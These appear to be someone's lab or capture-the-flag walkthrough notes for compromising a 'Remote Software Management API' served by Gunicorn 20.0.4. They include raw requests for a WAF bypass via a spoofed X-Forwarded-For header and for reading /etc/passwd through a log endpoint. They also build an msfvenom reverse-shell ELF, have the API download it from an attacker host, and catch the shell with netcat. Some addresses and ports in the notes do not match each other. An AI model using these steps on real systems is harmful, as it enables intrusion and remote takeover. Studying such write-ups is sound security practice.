# 2 :13337 remote software management api

```
http://192.168.76.134:13337/
Remote Software Management API
Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.

Usage:
GET /
returns this page

GET /version
Returns version of the app running.

POST /update
Updates the app from ELF file. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

GET /logs
Read log files.

GET /restart
To request the restart of the app.

$ gobuster dir -u http://192.168.76.134:13337/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 80 -x php,html,txt
===============================================================
/logs                 (Status: 403) [Size: 33]
/update               (Status: 405) [Size: 178]
/version              (Status: 200) [Size: 38

http://192.168.76.134:13337/version
1.0.0b8f887f33975ead915f336f57f0657180

# requesting logs
http://192.168.76.134:13337/logs
WAF: Access Denied for this Host.

# reading up online shows vulnerability for Gunicorn 20.0.4
https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling
https://blog.deteact.com/gunicorn-http-request-smuggling/
(info) https://portswigger.net/web-security/request-smuggling

# as WAF is middle of Gunicorn and us, set Header X-Forwarded-For to check if it works
# burp

GET /logs HTTP/1.1
Host: localhost:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
X-Forwarded-For: localhost
Connection: close
Content-Length: 0

# response
HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.4
Date: Sun, 05 Sep 2021 03:00:30 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 73

Error! No file specified. Use file=/path/to/log/file to access log files.

# setting parameter file in URL as its GET request
GET /logs?file=/etc/passwd HTTP/1.1
Host: localhost:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
X-Forwarded-For: localhost
Connection: close
Content-Length: 0

# reponse
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Sun, 05 Sep 2021 03:00:59 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2149
[truncated]
clumsyadmin@xposedapi:/home/clumsyadmin/k$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

# we have username
# time to restart service with malicious elf file

# shell
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.144 LPORT=445 -f elf -o kshell

# calling /update
POST /update HTTP/1.1
Host: 192.168.76.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close
Content-Type: application/json
Content-Length: 70

{
	"user": "clumsyadmin",
	"url": "http://192.168.49.76/kshell"
}

# response
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Sun, 05 Sep 2021 02:44:14 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 81

Update requested by clumsyadmin. Restart the software for changes to take effect.

# restarting
http://192.168.76.134:13337/restart
gives a popup and nothing happens; burp it

<script>
	function restart(){
		if(confirm("Do you really want to restart the app?")){
			var x = new XMLHttpRequest();
			x.open("POST", document.URL.toString());
			x.send('{"confirm":"true"}');
			window.location.assign(window.location.origin.toString());
		}
	}
</script>

# POST and send json `{"confirm":"true"}`

# request
POST /restart HTTP/1.1
Host: 192.168.76.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/json
Content-Length: 20

{"confirm":"true"}

# response
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Sun, 05 Sep 2021 02:46:27 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 19

Restart Successful.

$ nc -lvnp 13337
listening on [any] 13337 ...
connect to [192.168.49.76] from (UNKNOWN) [192.168.76.134] 42398
whoami;id;hostname;uname -a
clumsyadmin
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
xposedapi
Linux xposedapi 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64 GNU/Linux
```
